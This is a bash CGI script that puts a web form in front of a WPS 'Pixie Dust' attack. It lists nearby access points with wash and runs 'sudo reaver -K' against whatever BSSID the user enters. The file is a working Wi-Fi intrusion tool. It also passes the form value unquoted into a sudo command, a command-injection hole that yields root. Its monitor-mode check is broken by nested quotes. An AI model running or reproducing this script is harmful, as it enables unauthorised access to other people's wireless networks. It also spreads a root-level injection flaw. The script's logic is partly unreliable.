#!/bin/bash

echo "Content-type: text/html"
echo ""

echo '<html>'
echo '<head>'
echo '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">'
echo '<title>PixieWPS Attack</title>'
echo '</head>'
echo '<body>'

mon0check='ip addr | grep mon0 | awk '{print $1}' | cut -b 4'
if [ $mon0check -ne 0 ]; then
echo "<script>alert(\"Wi-Fi monitor mode is not enabled.\")</script>"
else
echo "<pre> $(sudo timeout 20 wash -i wlan0)"
fi  
  echo "<form method=GET action=\"${SCRIPT}\">"\
       '<table nowrap>'\
          '<tr><td>Enter BSSID to Attack</TD><TD><input type="text" name="BSSID" size=20></td></tr>'\
          '</tr></table>'

  echo '<br><input type="submit" value="Process Form">'\
       '<input type="reset" value="Reset"></form>'

  # Make sure we have been invoked properly.

  if [ "$REQUEST_METHOD" != "GET" ]; then
        echo "<hr>Script Error:"\
             "<br>Usage error, cannot complete request, REQUEST_METHOD!=GET."\
             "<br>Check your FORM declaration and be sure to use METHOD=\"GET\".<hr>"
        exit 1
  fi

  # If no search arguments, exit gracefully now.

  if [ -z "$QUERY_STRING" ]; then
        exit 0
  else
     # No looping this time, just extract the data you are looking for with sed:
     XX=`echo "$QUERY_STRING" | sed -n 's/^.*BSSID=\([^&]*\).*$/\1/p' | sed "s/%20/ /g" | sed "s/%3A/:/g"`
     echo "BSSID: " $XX
  fi
echo "<pre> $(sudo reaver -i wlan0 -b $XX -K -v)</pre>"
echo '</body>'
echo '</html>'

exit 0

